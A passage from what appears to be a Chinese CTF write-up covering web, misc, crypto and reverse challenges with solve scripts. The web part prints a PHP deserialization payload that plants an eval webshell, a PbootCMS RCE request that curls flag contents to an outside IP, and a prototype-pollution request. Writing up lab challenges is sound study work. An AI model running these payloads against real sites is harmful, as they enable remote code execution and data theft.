O%3A6%3A%22DB%5CJig%22%3A6%3A%7Bs%3A7%3A%22%00%2A%00uuid%22%3BN%3Bs%3A6%3A%22%00%2A%00dir%22%3Bs%3A2%3A%22.%2F%22%3Bs%3A9%3A%22%00%2A%00format%22%3Bi%3A1%3Bs%3A6%3A%22%00%2A%00log%22%3BN%3Bs%3A7%3A%22%00%2A%00data%22%3Ba%3A1%3A%7Bs%3A11%3A%22.%2Fsouth.php%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A54%3A%22%3C%3Fphp+echo+south%3B+phpinfo%28%29%3B+eval%28%24_POST%5B%22south%22%5D%29%3B+%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00lazy%22%3Bb%3A1%3B%7D%</span></span><br></pre></td></tr></table></figure>
<p>没权限，找了半天，然后认真看了一遍<strong>phpinfo</strong>才在环境变量里发现<strong>flag</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;183fd29a-abd2-44fc-b7ed-fdfec3e8b5bd&#125;</span><br></pre></td></tr></table></figure>
<h2 id="rceme">rceme</h2>
<p>随手搜了一下发现是<strong>PbootCMS
v1.3.2</strong>的命令执行漏洞。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /?a=&#123;if:`curl%20122.51.113.164:233/?%5C%60cat%20%2Fflag%5C%60`&#125;(1)&#123;end%20if&#125;</span><br><span class="line"># flag&#123;d9d115c5-9c21-4764-9023-ce9fd564a54a&#125;</span><br></pre></td></tr></table></figure>
<h2 id="littlegame">littlegame</h2>
<p><strong>npm install</strong>一下接着<strong>npm audit</strong>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                       === npm audit security report ===</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run  npm update set-value --depth 1  to resolve 1 vulnerability</span></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ High          │ Prototype Pollution                                          │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ set-value                                                    │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ set-value                                                    │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ set-value                                                    │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https://npmjs.com/advisories/1012                            │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">found 1 high severity vulnerability <span class="keyword">in</span> 61 scanned packages</span><br><span class="line">  run `npm audit fix` to fix 1 of them.</span><br></pre></td></tr></table></figure>
<p>报告了一个原型链污染，找到这个<a
href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">链接</a>。</p>
<p>根据源码和<strong>POC</strong>打，先访问<strong>/SpawnPoint</strong>，然后进行原型链污染。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /Privilege</span><br><span class="line"></span><br><span class="line">NewAttributeKey=__proto__.south&amp;NewAttributeValue=south</span><br></pre></td></tr></table></figure>
<p>最后拿到<strong>flag</strong>。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /DeveloperControlPanel</span><br><span class="line"></span><br><span class="line">key=south&amp;password=south</span><br><span class="line"></span><br><span class="line"># &lt;body&gt;flag&#123;771f673a-0fe4-473e-a5fe-bb9843b2664d&#125;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<h2 id="easytrick">easytrick</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;trick1 !== <span class="variable language_">$this</span>-&gt;trick2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick1) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick2) &amp;&amp; <span class="variable language_">$this</span>-&gt;trick1 != <span class="variable language_">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>利用<strong>string</strong>的特性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span> = <span class="string">&quot;NAN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span> = NAN;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">trick</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O%3A5%3A%22trick%22%3A2%3A%7Bs%3A6%3A%22trick1%22%3Bs%3A3%3A%22NAN%22%3Bs%3A6%3A%22trick2%22%3Bd%3ANAN%3B%7D%</span></span><br></pre></td></tr></table></figure>
<p>然后打一下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /?trick=O%3A5%3A&quot;trick&quot;%3A2%3A%7Bs%3A6%3A&quot;trick1&quot;%3Bs%3A3%3A&quot;NAN&quot;%3Bs%3A6%3A&quot;trick2&quot;%3Bd%3ANAN%3B%7D%</span><br><span class="line">flag&#123;e57a5617-e605-4978-81d6-311c516c7ca7&#125;</span><br></pre></td></tr></table></figure>
<h1 id="misc">MISC</h1>
<h2 id="电脑被黑">电脑被黑</h2>
<p>根据描述，恢复出一个<strong>demo</strong>和<strong>flag.txt</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ext3grep --restore-all disk_dump</span><br></pre></td></tr></table></figure>
<p><strong>IDA</strong>打开<strong>demo</strong>，简单修改一下就可以逆向。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+1Dh] [rbp-13h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+1Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  FILE *v7; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">34</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;rb+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = fgetc(v7);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        fputc((v4 ^ v6) - v5, stream);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fclose(v7);</span><br><span class="line">      fclose(stream);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># flag&#123;e5d7c4ed-b8f6-4417-8317-b809fc26c047&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="the_best_ctf_game">the_best_ctf_game</h2>
<p><strong>16</strong>进制打开过滤一下一些字符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;65e02f26-0d6e-463f-bc63-2df733e47fbe&#125;</span><br></pre></td></tr></table></figure>
<h1 id="crypto">Crypto</h1>
<h2 id="bd">bd</h2>
<p><strong>E</strong>很大，<strong>Wiener</strong>一把梭。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_hack_RSA</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Testing Wiener Attack&quot;</span>)</span><br><span class="line">    c = <span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">    e = <span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">    n = <span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">    hacked_d = hack_RSA(e, n)</span><br><span class="line">    <span class="built_in">print</span>(hacked_d)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(c, hacked_d, n))</span><br><span class="line"><span class="comment"># 56006392793428926653739441307877479859588558044180270732051018541455698198327268542258074930468108413</span></span><br></pre></td></tr></table></figure>
<p>然后转字符串。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="number">56006392793428926653739441307877479859588558044180270732051018541455698198327268542258074930468108413</span>)[<span class="number">2</span>:]))</span><br><span class="line"><span class="string">b&#x27;flag&#123;d3752538-90d0-c373-cfef-9247d3e16848&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="re">Re</h1>
<h2 id="z3">z3</h2>
<p><strong>IDA</strong>打开，是个解方程，结合题意的<strong>z3</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">res = [<span class="number">0x4F17</span>, <span class="number">0x9CF6</span>, <span class="number">0x8DDB</span>, <span class="number">0x8EA6</span>, <span class="number">0x6929</span>, <span class="number">0x9911</span>, <span class="number">0x40A2</span>, <span class="number">0x2F3E</span>, <span class="number">0x62B6</span>, <span class="number">0x4B82</span>, <span class="number">0x486C</span>, <span class="number">0x4002</span>, <span class="number">0x52D7</span>, <span class="number">0x2DEF</span>,</span><br><span class="line">       <span class="number">0x28DC</span>, <span class="number">0x640D</span>, <span class="number">0x528F</span>, <span class="number">0x613B</span>, <span class="number">0x4781</span>, <span class="number">0x6B17</span>, <span class="number">0x3237</span>, <span class="number">0x2A93</span>, <span class="number">0x615F</span>, <span class="number">0x50BE</span>, <span class="number">0x598E</span>, <span class="number">0x4656</span>, <span class="number">0x5B31</span>, <span class="number">0x313A</span>,</span><br><span class="line">       <span class="number">0x3010</span>, <span class="number">0x67FE</span>, <span class="number">0x4D5F</span>, <span class="number">0x58DB</span>, <span class="number">0x3799</span>, <span class="number">0x60A0</span>, <span class="number">0x2750</span>, <span class="number">0x3759</span>, <span class="number">0x8953</span>, <span class="number">0x7122</span>, <span class="number">0x81F9</span>, <span class="number">0x5524</span>, <span class="number">0x8971</span>, <span class="number">0x3A1D</span>]</span><br><span class="line">v46 = Int(<span class="string">&#x27;v46&#x27;</span>)</span><br><span class="line">v47 = Int(<span class="string">&#x27;v47&#x27;</span>)</span><br><span class="line">v48 = Int(<span class="string">&#x27;v48&#x27;</span>)</span><br><span class="line">v49 = Int(<span class="string">&#x27;v49&#x27;</span>)</span><br><span class="line">v50 = Int(<span class="string">&#x27;v50&#x27;</span>)</span><br><span class="line">v51 = Int(<span class="string">&#x27;v51&#x27;</span>)</span><br><span class="line">v52 = Int(<span class="string">&#x27;v52&#x27;</span>)</span><br><span class="line">v53 = Int(<span class="string">&#x27;v53&#x27;</span>)</span><br><span class="line">v54 = Int(<span class="string">&#x27;v54&#x27;</span>)</span><br><span class="line">v55 = Int(<span class="string">&#x27;v55&#x27;</span>)</span><br><span class="line">v56 = Int(<span class="string">&#x27;v56&#x27;</span>)</span><br><span class="line">v57 = Int(<span class="string">&#x27;v57&#x27;</span>)</span><br><span class="line">v58 = Int(<span class="string">&#x27;v58&#x27;</span>)</span><br><span class="line">v59 = Int(<span class="string">&#x27;v59&#x27;</span>)</span><br><span class="line">v60 = Int(<span class="string">&#x27;v60&#x27;</span>)</span><br><span class="line">v61 = Int(<span class="string">&#x27;v61&#x27;</span>)</span><br><span class="line">v62 = Int(<span class="string">&#x27;v62&#x27;</span>)</span><br><span class="line">v63 = Int(<span class="string">&#x27;v63&#x27;</span>)</span><br><span class="line">v64 = Int(<span class="string">&#x27;v64&#x27;</span>)</span><br><span class="line">v65 = Int(<span class="string">&#x27;v65&#x27;</span>)</span><br><span class="line">v66 = Int(<span class="string">&#x27;v66&#x27;</span>)</span><br><span class="line">v67 = Int(<span class="string">&#x27;v67&#x27;</span>)</span><br><span class="line">v68 = Int(<span class="string">&#x27;v68&#x27;</span>)</span><br><span class="line">v69 = Int(<span class="string">&#x27;v69&#x27;</span>)</span><br><span class="line">v70 = Int(<span class="string">&#x27;v70&#x27;</span>)</span><br><span class="line">v71 = Int(<span class="string">&#x27;v71&#x27;</span>)</span><br><span class="line">v72 = Int(<span class="string">&#x27;v72&#x27;</span>)</span><br><span class="line">v73 = Int(<span class="string">&#x27;v73&#x27;</span>)</span><br><span class="line">v74 = Int(<span class="string">&#x27;v74&#x27;</span>)</span><br><span class="line">v75 = Int(<span class="string">&#x27;v75&#x27;</span>)</span><br><span class="line">v76 = Int(<span class="string">&#x27;v76&#x27;</span>)</span><br><span class="line">v77 = Int(<span class="string">&#x27;v77&#x27;</span>)</span><br><span class="line">v78 = Int(<span class="string">&#x27;v78&#x27;</span>)</span><br><span class="line">v79 = Int(<span class="string">&#x27;v79&#x27;</span>)</span><br><span class="line">v80 = Int(<span class="string">&#x27;v80&#x27;</span>)</span><br><span class="line">v81 = Int(<span class="string">&#x27;v81&#x27;</span>)</span><br><span class="line">v82 = Int(<span class="string">&#x27;v82&#x27;</span>)</span><br><span class="line">v83 = Int(<span class="string">&#x27;v83&#x27;</span>)</span><br><span class="line">v84 = Int(<span class="string">&#x27;v84&#x27;</span>)</span><br><span class="line">v85 = Int(<span class="string">&#x27;v85&#x27;</span>)</span><br><span class="line">v86 = Int(<span class="string">&#x27;v86&#x27;</span>)</span><br><span class="line">v87 = Int(<span class="string">&#x27;v87&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(res[<span class="number">0</span>] == <span class="number">34</span> * v49 + <span class="number">12</span> * v46 + <span class="number">53</span> * v47 + <span class="number">6</span> * v48 + <span class="number">58</span> * v50 + <span class="number">36</span> * v51 + v52)</span><br><span class="line">s.add(res[<span class="number">1</span>] == <span class="number">27</span> * v50 + <span class="number">73</span> * v49 + <span class="number">12</span> * v48 + <span class="number">83</span> * v46 + <span class="number">85</span> * v47 + <span class="number">96</span> * v51 + <span class="number">52</span> * v52)</span><br><span class="line">s.add(res[<span class="number">2</span>] == <span class="number">24</span> * v48 + <span class="number">78</span> * v46 + <span class="number">53</span> * v47 + <span class="number">36</span> * v49 + <span class="number">86</span> * v50 + <span class="number">25</span> * v51 + <span class="number">46</span> * v52)</span><br><span class="line">s.add(res[<span class="number">3</span>] == <span class="number">78</span> * v47 + <span class="number">39</span> * v46 + <span class="number">52</span> * v48 + <span class="number">9</span> * v49 + <span class="number">62</span> * v50 + <span class="number">37</span> * v51 + <span class="number">84</span> * v52)</span><br><span class="line">s.add(res[<span class="number">4</span>] == <span class="number">48</span> * v50 + <span class="number">14</span> * v48 + <span class="number">23</span> * v46 + <span class="number">6</span> * v47 + <span class="number">74</span> * v49 + <span class="number">12</span> * v51 + <span class="number">83</span> * v52)</span><br><span class="line">s.add(res[<span class="number">5</span>] == <span class="number">15</span> * v51 + <span class="number">48</span> * v50 + <span class="number">92</span> * v48 + <span class="number">85</span> * v47 + <span class="number">27</span> * v46 + <span class="number">42</span> * v49 + <span class="number">72</span> * v52)</span><br><span class="line">s.add(res[<span class="number">6</span>] == <span class="number">26</span> * v51 + <span class="number">67</span> * v49 + <span class="number">6</span> * v47 + <span class="number">4</span> * v46 + <span class="number">3</span> * v48 + <span class="number">68</span> * v52)</span><br><span class="line">s.add(res[<span class="number">7</span>] == <span class="number">34</span> * v56 + <span class="number">12</span> * v53 + <span class="number">53</span> * v54 + <span class="number">6</span> * v55 + <span class="number">58</span> * v57 + <span class="number">36</span> * v58 + v59)</span><br><span class="line">s.add(res[<span class="number">8</span>] == <span class="number">27</span> * v57 + <span class="number">73</span> * v56 + <span class="number">12</span> * v55 + <span class="number">83</span> * v53 + <span class="number">85</span> * v54 + <span class="number">96</span> * v58 + <span class="number">52</span> * v59)</span><br><span class="line">s.add(res[<span class="number">9</span>] == <span class="number">24</span> * v55 + <span class="number">78</span> * v53 + <span class="number">53</span> * v54 + <span class="number">36</span> * v56 + <span class="number">86</span> * v57 + <span class="number">25</span> * v58 + <span class="number">46</span> * v59)</span><br><span class="line">s.add(res[<span class="number">10</span>] == <span class="number">78</span> * v54 + <span class="number">39</span> * v53 + <span class="number">52</span> * v55 + <span class="number">9</span> * v56 + <span class="number">62</span> * v57 + <span class="number">37</span> * v58 + <span class="number">84</span> * v59)</span><br><span class="line">s.add(res[<span class="number">11</span>] == <span class="number">48</span> * v57 + <span class="number">14</span> * v55 + <span class="number">23</span> * v53 + <span class="number">6</span> * v54 + <span class="number">74</span> * v56 + <span class="number">12</span> * v58 + <span class="number">83</span> * v59)</span><br><span class="line">s.add(res[<span class="number">12</span>] == <span class="number">15</span> * v58 + <span class="number">48</span> * v57 + <span class="number">92</span> * v55 + <span class="number">85</span> * v54 + <span class="number">27</span> * v53 + <span class="number">42</span> * v56 + <span class="number">72</span> * v59)</span><br><span class="line">s.add(res[<span class="number">13</span>] == <span class="number">26</span> * v58 + <span class="number">67</span> * v56 + <span class="number">6</span> * v54 + <span class="number">4</span> * v53 + <span class="number">3</span> * v55 + <span class="number">68</span> * v59)</span><br><span class="line">s.add(res[<span class="number">14</span>] == <span class="number">34</span> * v63 + <span class="number">12</span> * v60 + <span class="number">53</span> * v61 + <span class="number">6</span> * v62 + <span class="number">58</span> * v64 + <span class="number">36</span> * v65 + v66)</span><br><span class="line">s.add(res[<span class="number">15</span>] == <span class="number">27</span> * v64 + <span class="number">73</span> * v63 + <span class="number">12</span> * v62 + <span class="number">83</span> * v60 + <span class="number">85</span> * v61 + <span class="number">96</span> * v65 + <span class="number">52</span> * v66)</span><br><span class="line">s.add(res[<span class="number">16</span>] == <span class="number">24</span> * v62 + <span class="number">78</span> * v60 + <span class="number">53</span> * v61 + <span class="number">36</span> * v63 + <span class="number">86</span> * v64 + <span class="number">25</span> * v65 + <span class="number">46</span> * v66)</span><br><span class="line">s.add(res[<span class="number">17</span>] == <span class="number">78</span> * v61 + <span class="number">39</span> * v60 + <span class="number">52</span> * v62 + <span class="number">9</span> * v63 + <span class="number">62</span> * v64 + <span class="number">37</span> * v65 + <span class="number">84</span> * v66)</span><br><span class="line">s.add(res[<span class="number">18</span>] == <span class="number">48</span> * v64 + <span class="number">14</span> * v62 + <span class="number">23</span> * v60 + <span class="number">6</span> * v61 + <span class="number">74</span> * v63 + <span class="number">12</span> * v65 + <span class="number">83</span> * v66)</span><br><span class="line">s.add(res[<span class="number">19</span>] == <span class="number">15</span> * v65 + <span class="number">48</span> * v64 + <span class="number">92</span> * v62 + <span class="number">85</span> * v61 + <span class="number">27</span> * v60 + <span class="number">42</span> * v63 + <span class="number">72</span> * v66)</span><br><span class="line">s.add(res[<span class="number">20</span>] == <span class="number">26</span> * v65 + <span class="number">67</span> * v63 + <span class="number">6</span> * v61 + <span class="number">4</span> * v60 + <span class="number">3</span> * v62 + <span class="number">68</span> * v66)</span><br><span class="line">s.add(res[<span class="number">21</span>] == <span class="number">34</span> * v70 + <span class="number">12</span> * v67 + <span class="number">53</span> * v68 + <span class="number">6</span> * v69 + <span class="number">58</span> * v71 + <span class="number">36</span> * v72 + v73)</span><br><span class="line">s.add(res[<span class="number">22</span>] == <span class="number">27</span> * v71 + <span class="number">73</span> * v70 + <span class="number">12</span> * v69 + <span class="number">83</span> * v67 + <span class="number">85</span> * v68 + <span class="number">96</span> * v72 + <span class="number">52</span> * v73)</span><br><span class="line">s.add(res[<span class="number">23</span>] == <span class="number">24</span> * v69 + <span class="number">78</span> * v67 + <span class="number">53</span> * v68 + <span class="number">36</span> * v70 + <span class="number">86</span> * v71 + <span class="number">25</span> * v72 + <span class="number">46</span> * v73)</span><br><span class="line">s.add(res[<span class="number">24</span>] == <span class="number">78</span> * v68 + <span class="number">39</span> * v67 + <span class="number">52</span> * v69 + <span class="number">9</span> * v70 + <span class="number">62</span> * v71 + <span class="number">37</span> * v72 + <span class="number">84</span> * v73)</span><br><span class="line">s.add(res[<span class="number">25</span>] == <span class="number">48</span> * v71 + <span class="number">14</span> * v69 + <span class="number">23</span> * v67 + <span class="number">6</span> * v68 + <span class="number">74</span> * v70 + <span class="number">12</span> * v72 + <span class="number">83</span> * v73)</span><br><span class="line">s.add(res[<span class="number">26</span>] == <span class="number">15</span> * v72 + <span class="number">48</span> * v71 + <span class="number">92</span> * v69 + <span class="number">85</span> * v68 + <span class="number">27</span> * v67 + <span class="number">42</span> * v70 + <span class="number">72</span> * v73)</span><br><span class="line">s.add(res[<span class="number">27</span>] == <span class="number">26</span> * v72 + <span class="number">67</span> * v70 + <span class="number">6</span> * v68 + <span class="number">4</span> * v67 + <span class="number">3</span> * v69 + <span class="number">68</span> * v73)</span><br><span class="line">s.add(res[<span class="number">28</span>] == <span class="number">34</span> * v77 + <span class="number">12</span> * v74 + <span class="number">53</span> * v75 + <span class="number">6</span> * v76 + <span class="number">58</span> * v78 + <span class="number">36</span> * v79 + v80)</span><br><span class="line">s.add(res[<span class="number">29</span>] == <span class="number">27</span> * v78 + <span class="number">73</span> * v77 + <span class="number">12</span> * v76 + <span class="number">83</span> * v74 + <span class="number">85</span> * v75 + <span class="number">96</span> * v79 + <span class="number">52</span> * v80)</span><br><span class="line">s.add(res[<span class="number">30</span>] == <span class="number">24</span> * v76 + <span class="number">78</span> * v74 + <span class="number">53</span> * v75 + <span class="number">36</span> * v77 + <span class="number">86</span> * v78 + <span class="number">25</span> * v79 + <span class="number">46</span> * v80)</span><br><span class="line">s.add(res[<span class="number">31</span>] == <span class="number">78</span> * v75 + <span class="number">39</span> * v74 + <span class="number">52</span> * v76 + <span class="number">9</span> * v77 + <span class="number">62</span> * v78 + <span class="number">37</span> * v79 + <span class="number">84</span> * v80)</span><br><span class="line">s.add(res[<span class="number">32</span>] == <span class="number">48</span> * v78 + <span class="number">14</span> * v76 + <span class="number">23</span> * v74 + <span class="number">6</span> * v75 + <span class="number">74</span> * v77 + <span class="number">12</span> * v79 + <span class="number">83</span> * v80)</span><br><span class="line">s.add(res[<span class="number">33</span>] == <span class="number">15</span> * v79 + <span class="number">48</span> * v78 + <span class="number">92</span> * v76 + <span class="number">85</span> * v75 + <span class="number">27</span> * v74 + <span class="number">42</span> * v77 + <span class="number">72</span> * v80)</span><br><span class="line">s.add(res[<span class="number">34</span>] == <span class="number">26</span> * v79 + <span class="number">67</span> * v77 + <span class="number">6</span> * v75 + <span class="number">4</span> * v74 + <span class="number">3</span> * v76 + <span class="number">68</span> * v80)</span><br><span class="line">s.add(res[<span class="number">35</span>] == <span class="number">34</span> * v84 + <span class="number">12</span> * v81 + <span class="number">53</span> * v82 + <span class="number">6</span> * v83 + <span class="number">58</span> * v85 + <span class="number">36</span> * v86 + v87)</span><br><span class="line">s.add(res[<span class="number">36</span>] == <span class="number">27</span> * v85 + <span class="number">73</span> * v84 + <span class="number">12</span> * v83 + <span class="number">83</span> * v81 + <span class="number">85</span> * v82 + <span class="number">96</span> * v86 + <span class="number">52</span> * v87)</span><br><span class="line">s.add(res[<span class="number">37</span>] == <span class="number">24</span> * v83 + <span class="number">78</span> * v81 + <span class="number">53</span> * v82 + <span class="number">36</span> * v84 + <span class="number">86</span> * v85 + <span class="number">25</span> * v86 + <span class="number">46</span> * v87)</span><br><span class="line">s.add(res[<span class="number">38</span>] == <span class="number">78</span> * v82 + <span class="number">39</span> * v81 + <span class="number">52</span> * v83 + <span class="number">9</span> * v84 + <span class="number">62</span> * v85 + <span class="number">37</span> * v86 + <span class="number">84</span> * v87)</span><br><span class="line">s.add(res[<span class="number">39</span>] == <span class="number">48</span> * v85 + <span class="number">14</span> * v83 + <span class="number">23</span> * v81 + <span class="number">6</span> * v82 + <span class="number">74</span> * v84 + <span class="number">12</span> * v86 + <span class="number">83</span> * v87)</span><br><span class="line">s.add(res[<span class="number">40</span>] == <span class="number">15</span> * v86 + <span class="number">48</span> * v85 + <span class="number">92</span> * v83 + <span class="number">85</span> * v82 + <span class="number">27</span> * v81 + <span class="number">42</span> * v84 + <span class="number">72</span> * v87)</span><br><span class="line">s.add(res[<span class="number">41</span>] == <span class="number">26</span> * v86 + <span class="number">67</span> * v84 + <span class="number">6</span> * v82 + <span class="number">4</span> * v81 + <span class="number">3</span> * v83 + <span class="number">68</span> * v87)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">m = s.model()</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> m.decls():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#x27;%s&#x27;: %s,&quot;</span> % (d.name(), m[d]))</span><br><span class="line">    </span><br><span class="line">res = &#123;<span class="string">&#x27;v84&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;v65&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;v63&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;v74&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;v47&#x27;</span>: <span class="number">108</span>, <span class="string">&#x27;v62&#x27;</span>: <span class="number">98</span>, <span class="string">&#x27;v81&#x27;</span>: <span class="number">97</span>, <span class="string">&#x27;v64&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;v48&#x27;</span>: <span class="number">97</span>, <span class="string">&#x27;v51&#x27;</span>: <span class="number">55</span>,</span><br><span class="line">       <span class="string">&#x27;v58&#x27;</span>: <span class="number">51</span>, <span class="string">&#x27;v53&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;v49&#x27;</span>: <span class="number">103</span>, <span class="string">&#x27;v55&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;v57&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;v67&#x27;</span>: <span class="number">49</span>, <span class="string">&#x27;v54&#x27;</span>: <span class="number">55</span>, <span class="string">&#x27;v70&#x27;</span>: <span class="number">57</span>, <span class="string">&#x27;v69&#x27;</span>: <span class="number">45</span>, <span class="string">&#x27;v56&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">       <span class="string">&#x27;v86&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;v72&#x27;</span>: <span class="number">48</span>, <span class="string">&#x27;v60&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;v78&#x27;</span>: <span class="number">52</span>, <span class="string">&#x27;v68&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;v79&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;v75&#x27;</span>: <span class="number">54</span>, <span class="string">&#x27;v46&#x27;</span>: <span class="number">102</span>, <span class="string">&#x27;v77&#x27;</span>: <span 